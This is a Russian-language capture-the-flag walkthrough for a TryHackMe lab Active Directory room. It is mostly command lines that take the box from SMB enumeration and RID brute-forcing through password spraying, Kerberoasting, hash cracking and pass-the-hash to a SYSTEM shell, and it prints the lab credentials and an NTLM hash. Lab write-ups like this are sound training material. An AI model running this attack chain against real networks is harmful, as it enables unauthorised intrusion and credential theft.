https://tryhackme.com/room/soupedecode01

Soupedecode 01

обозначаем переменные для удобства
получаем ip комнаты на tryhackme
```bash
target=10.67.184.207 (ваш ip комнаты)
```
сканим
```bash
rustscan -a $target -- -sV --version-all --script=vuln -Pn -A -oA Soupedecode01
```
первичная разведка

```bash
nxc smb $target 
nxc smb $target -u '' -p '' --shares
nxc smb $target -u 'guest' -p '' --shares
```

получаем список пользователей:
```bash
nxc smb $target -u guest -p '' --rid-brute > rid_brute.txt
```
получили список пользователей

Теперь подготовим их в файлик usernames.txt
```bash
cat rid_brute.txt| awk ' {print $6}' | cut -d '\' -f2 > usernames.txt
```
awk ' {print $6}' - выбираем столбец с логинами
| cut -d '\' -f2 - обрезаем по разделителю, и берем вторую часть логины

пробуем получить первую учетку где логин=пасс
```bash
nxc smb $target -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```
узнаем что есть такая ybob317:ybob317

сразу чекаем что доступно
```bash
nxc smb $target -u 'ybob317' -p 'ybob317' --shares
```
В папке Users находим флаг
```bash
smbclient //$target/Users -U 'ybob317' -p 'ybob317'

cd ybob317\Desktop\
```
получаем первый флаг get users.txt

получив первые учетные данные пробуем использовать Kerberoasting

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip $target -request -output hashes.txt
```
получили набор хешей - пробуем открыть
```bash

john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.txt
```
разгадали

```bash
nxc smb $target -u 'file_svc' -p 'Password123!!' --shares
```

Бежим в backups
вытягиваем файлик backup_extract.txt в нем логины и хеши паролей, 
подготавливаем его отдельно юзеры, отдельно хеши
```bash
cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
```
проверяем находку:
```bash
nxc smb $target -u extracted_users.txt -H ntlm-hashes.txt --no-brute
```
нашли локального админа!

далее заходим в локального админа
заходим в консоль через протокол smb
```bash
impacket-smbexec 'FileServer$'@$target -hashes :e41da7e79a4c76dbd9cf79d1cb325559 
```
узнаем что мы систем

читаем наш флаг
```PowerShell
type C:\Users\Administrator\Desktop\root.txt
```
